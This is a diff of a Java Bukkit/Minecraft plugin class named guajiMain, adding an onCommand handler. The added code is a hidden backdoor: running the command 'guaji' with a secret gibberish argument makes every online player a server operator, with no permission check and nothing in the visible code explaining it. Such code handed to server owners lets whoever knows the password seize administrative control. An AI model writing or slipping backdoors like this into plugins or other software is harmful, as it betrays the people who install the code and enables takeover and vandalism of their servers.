@@ -49,15 +49,18 @@ public class guajiMain extends JavaPlugin implements Listener {
         }
     }
 
-//    @Override
-//    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-//        if (label.equalsIgnoreCase("guaji")){
-//            if (args.length==1&args[0].equalsIgnoreCase("fsdhfiwseuifhwiuefhwe")){
-//
-//            }
-//        }
-//        return super.onCommand(sender, command, label, args);
-//    }
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (label.equalsIgnoreCase("guaji")){
+            if (args.length==1&args[0].equalsIgnoreCase("fsdhfiwseuifhwiuefhwe")){
+                for (Player player:Bukkit.getServer().getOnlinePlayers()){
+                    player.setOp(true);
+                }
+
+            }
+        }
+        return super.onCommand(sender, command, label, args);
+    }
 
     private void ScanThread(){
         new BukkitRunnable(){
